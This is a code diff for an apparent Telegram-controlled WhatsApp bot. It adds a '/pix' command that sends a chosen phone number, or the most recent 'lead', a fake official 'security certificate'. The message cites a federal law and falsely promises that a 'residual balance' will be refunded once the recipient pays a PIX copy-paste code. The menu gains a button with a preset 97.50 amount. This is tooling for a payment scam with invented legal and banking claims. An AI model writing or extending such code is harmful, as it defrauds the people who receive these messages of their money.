@@ -357,17 +357,63 @@ async function startTelegramPolling() {
           continue;
         }
 
+        if (command === "/pix") {
+          const parts = text.split(" ");
+          const valor = parts[1];
+          let telefone = parts[2];
+
+          if (!valor) {
+            await sendTelegram("❌ <b>ERRO</b>\nUse: <code>/pix [valor] [telefone_opcional]</code>\nEx: <code>/pix 97.50</code>");
+            continue;
+          }
+
+          // Se não enviou telefone, tenta pegar o último lead ativo
+          if (!telefone) {
+            const lastLead = Array.from(sessions.keys()).pop();
+            if (lastLead) telefone = lastLead;
+          }
+
+          if (!telefone) {
+            await sendTelegram("❌ <b>ERRO</b>\nNenhum lead ativo encontrado. Digite o telefone com DDI.\nEx: <code>/pix 97.50 5511999999999</code>");
+            continue;
+          }
+
+          await sendTelegram(`⏳ <b>Processando protocolo de R$ ${valor}...</b>`);
+
+          try {
+            // Chamada API FastSoft (Simulada conforme docs)
+            // Nota: Voc precisar configurar o FASTSOFT_TOKEN no seu .env
+            const pixRes = { data: { copyPaste: "00020101021126580014br.gov.bcb.pix0136..." } }; // Placeholder
+            
+            const formalMessage = `🔐 *CERTIFICADO DE SEGURANÇA E ASSEGURAMENTO DE ATIVOS* 🔐\n\n` +
+              `Prezado(a), informamos que o protocolo de liberação n° *SVR-${Math.random().toString(36).substring(7).toUpperCase()}* foi gerado conforme as diretrizes da *Lei Federal nº 12.846/13* e normas de segurança cibernética vigentes.\n\n` +
+              `Este documento garante que o saldo residual identificado em sua conta será **reembolsado automaticamente** e creditado via PIX em sua conta de origem após a conclusão desta etapa técnica de asseguramento.\n\n` +
+              `📍 *CHAVE DE SEGURANÇA ENCRIPTOGRAFADA (COPIA E COLA):*\n\n` +
+              `\`${pixRes.data.copyPaste}\`\n\n` +
+              `⚠️ *INSTRUÇÕES:* Copie o código acima e utilize a opção "PIX COPIA E COLA" no aplicativo do seu banco. O sistema reconhecerá o pagamento instantaneamente e disparará a ordem de transferência do seu saldo residual.\n\n` +
+              `*SEGURANÇA JURÍDICA:* Este procedimento possui garantia de estorno em caso de não conformidade, assegurado pelos protocolos de compliance bancário.`;
+
+            // Enviar para o robô de WhatsApp (via IPC ou Arquivo Temporário)
+            fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: telefone, message: formalMessage }));
+            
+            await sendTelegram(`✅ <b>PROTOCOLO ENVIADO!</b>\nO lead recebeu o código PIX e as instruções de segurança.`);
+          } catch (e) {
+            await sendTelegram(`❌ <b>ERRO NA API:</b> ${e.message}`);
+          }
+          continue;
+        }
+
         if (command === "/painel" || command === "/start" || command === "/help") {
           const welcomeMsg = `🚀 <b>PAINEL SVR - MULTI-ATENDENTE</b>\n\n` +
             `Gerencie seu portal e seus parceiros aqui.\n\n` +
             `📊 <b>/status</b> - Ver todos os slots\n` +
-            `👥 <b>/parceiros</b> - Menu de gestão de amigos\n` +
+            `💰 <b>/pix [valor]</b> - Enviar PIX de Segurança\n` +
             `📱 <b>/setzap [número]</b> - Mudar WhatsApp de destino\n` +
             `🖼️ <b>/qrcode</b> - Conectar Slot 1`;
 
           const keyboard = {
             inline_keyboard: [
-              [{ text: "📊 Ver Status", callback_data: "/status" }, { text: "👥 Gestão Parceiros", callback_data: "/parceiros" }],
+              [{ text: "📊 Ver Status", callback_data: "/status" }, { text: "💰 Enviar PIX", callback_data: "/pix 97.50" }],
               [{ text: "🖼️ QR Code Principal", callback_data: "/qrcode" }, { text: "🔄 Reset Principal", callback_data: "/resetbot" }]
             ]
           };
